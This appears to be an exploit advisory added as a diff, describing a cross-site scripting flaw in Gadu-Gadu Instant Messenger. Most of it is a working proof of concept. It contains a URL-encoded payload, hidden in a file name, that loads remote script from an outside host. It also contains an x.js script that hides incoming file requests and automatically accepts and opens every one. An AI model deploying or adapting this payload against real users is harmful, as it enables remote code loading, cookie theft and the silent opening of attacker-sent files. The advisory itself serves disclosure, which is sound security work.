@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/47957/info
+
+Gadu-Gadu Instant Messenger is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks. 
+
+file name that loads external x.js code:
+<input
+onfocus="eval(unescape('x%3Ddocument.getElementsByTagName%28%27head%27%29.item%280%29%3By%3Ddocument.createElement%28%27script%27%29%3By.src%3D%27http:%2f%2fasd.pl%2fx.js%27%3Bx.appendChild%28y%29%3B'));this.setAttribute('onfocus',0);"
+autofocus>
+
+example x.js code to hide, accept and open every file request:
+
+document.getElementById('extra').innerHTML = '<style>.file,
+.entrySeparator{display:none;}</style>';
+n = document.getElementById('open_file');
+n.setAttribute('id', '');
+
+function ff(){
+    if(f = document.getElementById('open_file')) {
+        e = document.createEvent("HTMLEvents");
+        e.initEvent('click', true, true);
+        f.dispatchEvent(e);
+        f.setAttribute('id', '');
+    }
+    setTimeout('ff()', 1000);
+}
+
+ff();
